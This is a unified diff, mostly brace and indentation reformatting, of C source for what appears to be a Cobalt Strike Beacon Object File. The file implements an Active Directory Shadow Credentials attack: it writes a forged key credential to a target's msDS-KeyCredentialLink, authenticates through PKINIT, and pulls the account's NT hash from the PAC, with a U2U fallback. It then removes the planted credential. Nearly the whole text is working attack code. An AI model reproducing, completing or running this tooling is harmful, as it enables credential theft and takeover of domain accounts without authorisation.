     final[fOffset++] = 0x76; /* [APPLICATION 22] */
     if (kOffset + 2 < 128) {
         final[fOffset++] = (BYTE)(kOffset + 2);
-    } else {
+    }
+    else {
         final[fOffset++] = 0x82;
         final[fOffset++] = (BYTE)((kOffset + 2) >> 8);
         final[fOffset++] = (BYTE)((kOffset + 2) & 0xFF);
@@ -3177,7 +3184,8 @@ static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessi
     final[fOffset++] = 0x30;
     if (kOffset < 128) {
         final[fOffset++] = (BYTE)kOffset;
-    } else {
+    }
+    else {
         final[fOffset++] = 0x82;
         final[fOffset++] = (BYTE)(kOffset >> 8);
         final[fOffset++] = (BYTE)(kOffset & 0xFF);
@@ -3209,9 +3217,9 @@ static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessi
  * =============================================================================
  */
 
-/* Build U2U Authenticator */
+ /* Build U2U Authenticator */
 static BYTE* BuildU2UAuthenticator(const char* user, const char* realm, BYTE* sessionKey, int sessionKeyLen,
-                                    BYTE* reqBody, int reqBodyLen, int* outLen) {
+    BYTE* reqBody, int reqBodyLen, int* outLen) {
     BYTE* authContent = (BYTE*)malloc(4096);
     int offset = 0;
 
@@ -3248,7 +3256,7 @@ static BYTE* BuildU2UAuthenticator(const char* user, const char* realm, BYTE* se
     /* cksum [3] Checksum - checksum of req-body */
     int checksumValueLen;
     BYTE* checksumValue = ComputeKerberosChecksum(sessionKey, sessionKeyLen, reqBody, reqBodyLen,
-                                                   KRB_KEY_USAGE_TGS_REQ_AUTH_CKSUM, &checksumValueLen);
+        KRB_KEY_USAGE_TGS_REQ_AUTH_CKSUM, &checksumValueLen);
     if (checksumValue) {
         BYTE cksumContent[64];
         int cksumOffset = 0;
@@ -3300,7 +3308,7 @@ static BYTE* BuildU2UAuthenticator(const char* user, const char* realm, BYTE* se
     /* ctime [5] KerberosTime */
     char timeStr[32];
     sprintf(timeStr, "%04d%02d%02d%02d%02d%02dZ",
-            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
+        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
     int ctimeLen;
     BYTE* ctime = BuildGeneralizedTime(timeStr, &ctimeLen);
     int ctimeTagLen;
@@ -3412,7 +3420,7 @@ static BYTE* BuildU2UApReq(BYTE* ticket, int ticketLen, BYTE* encAuthenticator, 
 
 /* Build U2U TGS-REQ */
 static BYTE* BuildU2UTgsReq(const char* user, const char* realm, BYTE* ticket, int ticketLen,
-                            BYTE* sessionKey, int sessionKeyLen, int* outLen) {
+    BYTE* sessionKey, int sessionKeyLen, int* outLen) {
     BYTE* reqBodyContent = (BYTE*)malloc(4096);
     int rbOffset = 0;
 
@@ -3452,7 +3460,7 @@ static BYTE* BuildU2UTgsReq(const char* user, const char* realm, BYTE* ticket, i
     GetSystemTime(&st);
     char tillStr[32];
     sprintf(tillStr, "%04d%02d%02d%02d%02d%02dZ",
-            st.wYear, st.wMonth, st.wDay + 1, st.wHour, st.wMinute, st.wSecond);
+        st.wYear, st.wMonth, st.wDay + 1, st.wHour, st.wMinute, st.wSecond);
     int tillLen;
     BYTE* till = BuildGeneralizedTime(tillStr, &tillLen);
     int tillTagLen;
@@ -3509,7 +3517,7 @@ static BYTE* BuildU2UTgsReq(const char* user, const char* realm, BYTE* ticket, i
     /* Build Authenticator with checksum of req-body */
     int authenticatorLen;
     BYTE* authenticator = BuildU2UAuthenticator(user, realm, sessionKey, sessionKeyLen,
-                                                 reqBodySeq, reqBodySeqLen, &authenticatorLen);
+        reqBodySeq, reqBodySeqLen, &authenticatorLen);
     if (!authenticator) {
         free(reqBodySeq);
         return NULL;
@@ -3518,7 +3526,7 @@ static BYTE* BuildU2UTgsReq(const char* user, const char* realm, BYTE* ticket, i
     /* Encrypt authenticator with session key (key usage 7) */
     int encAuthLen;
     BYTE* encAuth = KerberosEncrypt(ETYPE_AES256_CTS_HMAC_SHA1, KRB_KEY_USAGE_TGS_REQ_AUTH,
-                                     sessionKey, sessionKeyLen, authenticator, authenticatorLen, &encAuthLen);
+        sessionKey, sessionKeyLen, authenticator, authenticatorLen, &encAuthLen);
     free(authenticator);
 
     if (!encAuth) {
@@ -3625,7 +3633,7 @@ static BYTE* BuildU2UTgsReq(const char* user, const char* realm, BYTE* ticket, i
  * =============================================================================
  */
 
-/* Extract ticket enc-part cipher from TGS-REP ticket */
+ /* Extract ticket enc-part cipher from TGS-REP ticket */
 static BYTE* ExtractTicketEncPartFromTgsRep(BYTE* tgsRep, int tgsRepLen, int* cipherLen) {
     int offset = 0;
     int length;
@@ -3686,33 +3694,39 @@ static BYTE* ExtractTicketEncPartFromTgsRep(BYTE* tgsRep, int tgsRepLen, int* ci
                                     memcpy(cipherData, tgsRep + offset, *cipherLen);
                                     return cipherData;
                                 }
-                            } else if ((tgsRep[offset] & 0xE0) == 0xA0) {
+                            }
+                            else if ((tgsRep[offset] & 0xE0) == 0xA0) {
                                 offset++;
                                 int skipLen;
                                 offset += DecodeLength(tgsRep, offset, &skipLen);
                                 offset += skipLen;
-                            } else {
+                            }
+                            else {
                                 offset++;
                             }
                         }
                     }
                     break;
-                } else if ((tgsRep[offset] & 0xE0) == 0xA0) {
+                }
+                else if ((tgsRep[offset] & 0xE0) == 0xA0) {
                     offset++;
                     int skipLen;
                     offset += DecodeLength(tgsRep, offset, &skipLen);
                     offset += skipLen;
-                } else {
+                }
+                else {
                     offset++;
                 }
             }
             break;
-        } else if ((tgsRep[offset] & 0xE0) == 0xA0) {
+        }
+        else if ((tgsRep[offset] & 0xE0) == 0xA0) {
             offset++;
             int skipLen;
             offset += DecodeLength(tgsRep, offset, &skipLen);
             offset += skipLen;
-        } else {
+        }
+        else {
             offset++;
         }
     }
@@ -3759,7 +3773,8 @@ static BYTE* ExtractPacFromAuthData(BYTE* authData, int authDataLen, int* pacLen
                             adType = (adType << 8) | authData[offset++];
                         }
                     }
-                } else if (authData[offset] == 0xA1) { /* ad-data [1] */
+                }
+                else if (authData[offset] == 0xA1) { /* ad-data [1] */
                     offset++;
                     offset += DecodeLength(authData, offset, &length);
                     if (authData[offset] == 0x04) {
@@ -3768,7 +3783,8 @@ static BYTE* ExtractPacFromAuthData(BYTE* authData, int authDataLen, int* pacLen
                         adData = authData + offset;
                         offset += adDataLen;
                     }
-                } else {
+                }
+                else {
                     offset++;
                 }
             }
@@ -3776,7 +3792,8 @@ static BYTE* ExtractPacFromAuthData(BYTE* authData, int authDataLen, int* pacLen
             if (adType == 1 && adData) { /* AD-IF-RELEVANT - recurse */
                 BYTE* result = ExtractPacFromAuthData(adData, adDataLen, pacLen);
                 if (result) return result;
-            } else if (adType == 128 && adData) { /* PAC */
+            }
+            else if (adType == 128 && adData) { /* PAC */
                 BYTE* result = (BYTE*)malloc(adDataLen);
                 memcpy(result, adData, adDataLen);
                 *pacLen = adDataLen;
@@ -3784,7 +3801,8 @@ static BYTE* ExtractPacFromAuthData(BYTE* authData, int authDataLen, int* pacLen
             }
 
             offset = elemEnd;
-        } else {
+        }
+        else {
             offset++;
         }
     }
@@ -3816,12 +3834,14 @@ static BYTE* ExtractPacFromEncTicketPart(BYTE* encTicketPart, int encTicketPartL
             int authDataLen;
             offset += DecodeLength(encTicketPart, offset, &authDataLen);
             return ExtractPacFromAuthData(encTicketPart + offset, authDataLen, pacLen);
-        } else if ((encTicketPart[offset] & 0xE0) == 0xA0) {
+        }
+        else if ((encTicketPart[offset] & 0xE0) == 0xA0) {
             offset++;
             int skipLen;
             offset += DecodeLength(encTicketPart, offset, &skipLen);
             offset += skipLen;
-        } else {
+        }
+        else {
             offset++;
         }
     }
@@ -3869,12 +3889,13 @@ static void ParsePacAndExtractNtHash(BYTE* pac, int pacLen, BYTE* replyKey, int 
 
             /* Decrypt with AS reply key (key usage 16) */
             decrypted = KerberosDecrypt(encType, KRB_KEY_USAGE_PAC_CREDENTIAL,
-                                        replyKey, replyKeyLen, encData, encDataLen, &decLen);
+                replyKey, replyKeyLen, encData, encDataLen, &decLen);
 
             if (decrypted) {
                 ParsePacCredentialData(decrypted, decLen);
                 free(decrypted);
-            } else {
+            }
+            else {
                 BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to decrypt PAC_CREDENTIAL_INFO");
             }
         }
@@ -3885,7 +3906,7 @@ static void ParsePacAndExtractNtHash(BYTE* pac, int pacLen, BYTE* replyKey, int 
 
 /* Process TGS-REP and extract NT hash */
 static void ProcessTgsRep(BYTE* tgsRep, int tgsRepLen, BYTE* sessionKey, int sessionKeyLen,
-                          BYTE* replyKey, int replyKeyLen) {
+    BYTE* replyKey, int replyKeyLen) {
     int ticketEncPartLen;
     BYTE* ticketEncPart;
     int decTicketLen;
@@ -3916,7 +3937,7 @@ static void ProcessTgsRep(BYTE* tgsRep, int tgsRepLen, BYTE* sessionKey, int ses
 
     /* Decrypt with session key (key usage 2 for U2U ticket enc-part) */
     decTicket = KerberosDecrypt(ETYPE_AES256_CTS_HMAC_SHA1, KRB_KEY_USAGE_TICKET_ENCPART,
-                                sessionKey, sessionKeyLen, ticketEncPart, ticketEncPartLen, &decTicketLen);
+        sessionKey, sessionKeyLen, ticketEncPart, ticketEncPartLen, &decTicketLen);
     free(ticketEncPart);
 
     if (!decTicket) {
@@ -3940,8 +3961,8 @@ static void ProcessTgsRep(BYTE* tgsRep, int tgsRepLen, BYTE* sessionKey, int ses
 
 /* Perform U2U TGS-REQ to extract NT hash */
 static void PerformU2U(const char* kdcHost, const char* user, const char* realm,
-                       BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessionKeyLen,
-                       BYTE* replyKey, int replyKeyLen) {
+    BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessionKeyLen,
+    BYTE* replyKey, int replyKeyLen) {
     int tgsReqLen;
     BYTE* tgsReq;
     int tgsRepLen;
@@ -3986,15 +4007,15 @@ static BYTE* ExtractPaPacCredentials(BYTE* asRep, int asRepLen, int* outLen) {
 
     /* Look for PA-DATA type 167 (PA-PAC-CREDENTIALS) */
     for (i = 0; i < asRepLen - 20; i++) {
-        if (asRep[i] == 0x30 && asRep[i+2] == 0xA1) { /* SEQUENCE { padata-type [1] */
+        if (asRep[i] == 0x30 && asRep[i + 2] == 0xA1) { /* SEQUENCE { padata-type [1] */
             int j;
             for (j = i; j < i + 20 && j < asRepLen - 5; j++) {
                 if (asRep[j] == 0x02) { /* INTEGER */
-                    int intLen = asRep[j+1];
+                    int intLen = asRep[j + 1];
                     int value = 0;
                     int k;
                     for (k = 0; k < intLen; k++) {
-                        value = (value << 8) | asRep[j+2+k];
+                        value = (value << 8) | asRep[j + 2 + k];
                     }
 
                     if (value == PA_PAC_CREDENTIALS) {
@@ -4003,12 +4024,12 @@ static BYTE* ExtractPaPacCredentials(BYTE* asRep, int asRepLen, int* outLen) {
                         for (m = j + 2 + intLen; m < asRepLen - 5; m++) {
                             if (asRep[m] == 0xA2) { /* [2] padata-value */
                                 int padataLen;
-                                int padataLenBytes = DecodeLength(asRep, m+1, &padataLen);
+                                int padataLenBytes = DecodeLength(asRep, m + 1, &padataLen);
                                 int octetStart = m + 1 + padataLenBytes;
 
                                 if (asRep[octetStart] == 0x04) {
                                     int credLen;
-                                    int credLenBytes = DecodeLength(asRep, octetStart+1, &credLen);
+                                    int credLenBytes = DecodeLength(asRep, octetStart + 1, &credLen);
 
                                     *outLen = credLen;
                                     BYTE* cred = (BYTE*)malloc(credLen);
@@ -4052,10 +4073,10 @@ static void ParsePacCredentialData(BYTE* data, int dataLen) {
 
     /* Method 1: Search for "NTLM" string (Unicode: 'N' 00 'T' 00 'L' 00 'M' 00) */
     for (i = 0; i < dataLen - 50; i++) {
-        if (data[i] == 'N' && data[i+1] == 0 &&
-            data[i+2] == 'T' && data[i+3] == 0 &&
-            data[i+4] == 'L' && data[i+5] == 0 &&
-            data[i+6] == 'M' && data[i+7] == 0) {
+        if (data[i] == 'N' && data[i + 1] == 0 &&
+            data[i + 2] == 'T' && data[i + 3] == 0 &&
+            data[i + 4] == 'L' && data[i + 5] == 0 &&
+            data[i + 6] == 'M' && data[i + 7] == 0) {
 
             /*
              * NTLM_SUPPLEMENTAL_CREDENTIAL follows after package name + padding
@@ -4092,7 +4113,7 @@ static void ParsePacCredentialData(BYTE* data, int dataLen) {
     }
 
     /* Method 2: Direct scan at common NDR offsets */
-    int offsets[] = {0x28, 0x30, 0x38, 0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70};
+    int offsets[] = { 0x28, 0x30, 0x38, 0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70 };
     for (j = 0; j < 10; j++) {
         int off = offsets[j];
         if (off + 40 <= dataLen) {
@@ -4132,16 +4153,16 @@ static void ParsePacCredentialData(BYTE* data, int dataLen) {
 
 static const char* GetKrbErrorDesc(int code) {
     switch (code) {
-        case 6:  return "KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found";
-        case 7:  return "KDC_ERR_S_PRINCIPAL_UNKNOWN - Server not found";
-        case 14: return "KDC_ERR_ETYPE_NOSUPP - Encryption type not supported";
-        case 18: return "KDC_ERR_CLIENT_REVOKED - Client credentials revoked";
-        case 24: return "KDC_ERR_PREAUTH_FAILED - Pre-authentication failed";
-        case 25: return "KDC_ERR_PREAUTH_REQUIRED - Pre-authentication required";
-        case 29: return "KDC_ERR_SVC_UNAVAILABLE - Service unavailable";
-        case 37: return "KRB_AP_ERR_SKEW - Clock skew too great";
-        case 68: return "KDC_ERR_WRONG_REALM - Wrong realm";
-        default: return "Unknown error";
+    case 6:  return "KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found";
+    case 7:  return "KDC_ERR_S_PRINCIPAL_UNKNOWN - Server not found";
+    case 14: return "KDC_ERR_ETYPE_NOSUPP - Encryption type not supported";
+    case 18: return "KDC_ERR_CLIENT_REVOKED - Client credentials revoked";
+    case 24: return "KDC_ERR_PREAUTH_FAILED - Pre-authentication failed";
+    case 25: return "KDC_ERR_PREAUTH_REQUIRED - Pre-authentication required";
+    case 29: return "KDC_ERR_SVC_UNAVAILABLE - Service unavailable";
+    case 37: return "KRB_AP_ERR_SKEW - Clock skew too great";
+    case 68: return "KDC_ERR_WRONG_REALM - Wrong realm";
+    default: return "Unknown error";
     }
 }
 
@@ -4152,7 +4173,7 @@ static const char* GetKrbErrorDesc(int code) {
  */
 
 static void ProcessAsRep(BYTE* asRep, int asRepLen, PCCERT_CONTEXT pCert,
-                         const char* user, const char* realm, const char* kdcHost) {
+    const char* user, const char* realm, const char* kdcHost) {
     int i;
     int kdcPubKeyLen, serverNonceLen, encPartLen, decryptedLen, sessionKeyLen, sessionKeyType;
     BYTE* kdcPubKey;
@@ -4170,12 +4191,12 @@ static void ProcessAsRep(BYTE* asRep, int asRepLen, PCCERT_CONTEXT pCert,
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Received KRB-ERROR");
         int errCode = -1;
         for (i = 0; i < asRepLen - 5; i++) {
-            if (asRep[i] == 0xA6 && asRep[i+2] == 0x02) {
+            if (asRep[i] == 0xA6 && asRep[i + 2] == 0x02) {
                 errCode = 0;
-                int errLen = asRep[i+3];
+                int errLen = asRep[i + 3];
                 int j;
                 for (j = 0; j < errLen; j++) {
-                    errCode = (errCode << 8) | asRep[i+4+j];
+                    errCode = (errCode << 8) | asRep[i + 4 + j];
                 }
                 BeaconPrintf(CALLBACK_OUTPUT, "[!] Error code: %d (0x%X)", errCode, errCode);
                 BeaconPrintf(CALLBACK_OUTPUT, "[!] %s", GetKrbErrorDesc(errCode));
@@ -4223,7 +4244,7 @@ static void ProcessAsRep(BYTE* asRep, int asRepLen, PCCERT_CONTEXT pCert,
     }
 
     decrypted = KerberosDecrypt(ETYPE_AES256_CTS_HMAC_SHA1, KRB_KEY_USAGE_AS_REP_ENCPART,
-                                 replyKey, 32, encPart, encPartLen, &decryptedLen);
+        replyKey, 32, encPart, encPartLen, &decryptedLen);
     free(encPart);
 
     if (!decrypted) {
@@ -4261,16 +4282,18 @@ static void ProcessAsRep(BYTE* asRep, int asRepLen, PCCERT_CONTEXT pCert,
     if (pacCred) {
         int decCredLen;
         BYTE* decCred = KerberosDecrypt(sessionKeyType, KRB_KEY_USAGE_PAC_CREDENTIAL,
-                                        sessionKey, sessionKeyLen, pacCred, pacCredLen, &decCredLen);
+            sessionKey, sessionKeyLen, pacCred, pacCredLen, &decCredLen);
         free(pacCred);
 
         if (decCred) {
             ParsePacCredentialData(decCred, decCredLen);
             free(decCred);
-        } else {
+        }
+        else {
             BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to decrypt PA-PAC-CREDENTIALS");
         }
-    } else {
+    }
+    else {
         /* Fallback to U2U */
         int tgtLen;
         BYTE* tgt = ExtractTicketFromAsRep(asRep, asRepLen, &tgtLen);
@@ -4301,7 +4324,8 @@ static void GetKdcForDomain(const char* domain, char* kdcHost, int kdcHostLen) {
     if (DsGetDcNameW(NULL, wDomain, NULL, NULL, DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &dcInfo) == ERROR_SUCCESS) {
         WideCharToMultiByte(CP_ACP, 0, dcInfo->DomainControllerName + 2, -1, kdcHost, kdcHostLen, NULL, NULL);
         NetApiBufferFree(dcInfo);
-    } else {
+    }
+    else {
         strcpy(kdcHost, domain);
     }
 }
@@ -4322,10 +4346,10 @@ int main(int argc, char* argv[]) {
     char* szTarget = NULL;
     char* szDomain = NULL;
     char* szKdc = NULL;
-    WCHAR wszTargetDN[512] = {0};
+    WCHAR wszTargetDN[512] = { 0 };
     BYTE* pbUserSID = NULL;
     DWORD dwUserSIDLen = 0;
-    char szSIDString[128] = {0};
+    char szSIDString[128] = { 0 };
     BYTE* pbPublicKey = NULL;
     int nPublicKeyLen = 0;
     BYTE* pbPfx = NULL;
@@ -4333,7 +4357,7 @@ int main(int argc, char* argv[]) {
     BYTE* pbKeyCredBlob = NULL;
     int nKeyCredBlobLen = 0;
     GUID deviceId;
-    char kdcBuf[256] = {0};
+    char kdcBuf[256] = { 0 };
 
 #ifdef BOF
     /* Parse arguments */
@@ -4397,8 +4421,8 @@ int main(int argc, char* argv[]) {
 
     /* Step 2: Generate keypair and certificate */
     if (!GenerateCertificateAndKey(szTarget, szDomain, szSIDString,
-                                   &pbPublicKey, &nPublicKeyLen,
-                                   &pbPfx, &nPfxLen, &deviceId)) {
+        &pbPublicKey, &nPublicKeyLen,
+        &pbPfx, &nPfxLen, &deviceId)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to generate certificate");
         goto cleanup;
     }
@@ -4420,9 +4444,9 @@ int main(int argc, char* argv[]) {
         goto cleanup;
     }
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Shadow Credential written (Device ID: %08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X)",
-                 deviceId.Data1, deviceId.Data2, deviceId.Data3,
-                 deviceId.Data4[0], deviceId.Data4[1], deviceId.Data4[2], deviceId.Data4[3],
-                 deviceId.Data4[4], deviceId.Data4[5], deviceId.Data4[6], deviceId.Data4[7]);
+        deviceId.Data1, deviceId.Data2, deviceId.Data3,
+        deviceId.Data4[0], deviceId.Data4[1], deviceId.Data4[2], deviceId.Data4[3],
+        deviceId.Data4[4], deviceId.Data4[5], deviceId.Data4[6], deviceId.Data4[7]);
 
     /* Output PFX first */
     {
@@ -4443,7 +4467,7 @@ int main(int argc, char* argv[]) {
         CRYPT_DATA_BLOB pfxBlob;
         HCERTSTORE hPfxStore;
         PCCERT_CONTEXT pCert;
-        char realm[256] = {0};
+        char realm[256] = { 0 };
         int ri;
 
         pfxBlob.pbData = pbPfx;
@@ -4465,14 +4489,15 @@ int main(int argc, char* argv[]) {
         /* Get KDC */
         if (szKdc && szKdc[0]) {
             strcpy(kdcBuf, szKdc);
-        } else {
+        }
+        else {
             GetKdcForDomain(szDomain, kdcBuf, sizeof(kdcBuf));
         }
 
         /* Convert domain to uppercase for realm */
         for (ri = 0; szDomain[ri] && ri < 255; ri++) {
             realm[ri] = (szDomain[ri] >= 'a' && szDomain[ri] <= 'z')
-                      ? szDomain[ri] - 'a' + 'A' : szDomain[ri];
+                ? szDomain[ri] - 'a' + 'A' : szDomain[ri];
         }
         realm[ri] = '\0';
 
@@ -4487,12 +4512,14 @@ int main(int argc, char* argv[]) {
             if (asRep) {
                 ProcessAsRep(asRep, asRepLen, pCert, szTarget, realm, kdcBuf);
                 free(asRep);
-            } else {
+            }
+            else {
                 BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to receive AS-REP from KDC");
             }
 
             free(asReq);
-        } else {
+        }
+        else {
             BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to build PKINIT AS-REQ");
         }
 
@@ -4505,7 +4532,8 @@ skip_pkinit:
     if (g_wszKeyCredValue) {
         if (DeleteKeyCredentialLink(szDomain, wszTargetDN)) {
             BeaconPrintf(CALLBACK_OUTPUT, "[+] Shadow Credential removed from msDS-KeyCredentialLink");
-        } else {
+        }
+        else {
             BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to remove Shadow Credential");
         }
         free(g_wszKeyCredValue);
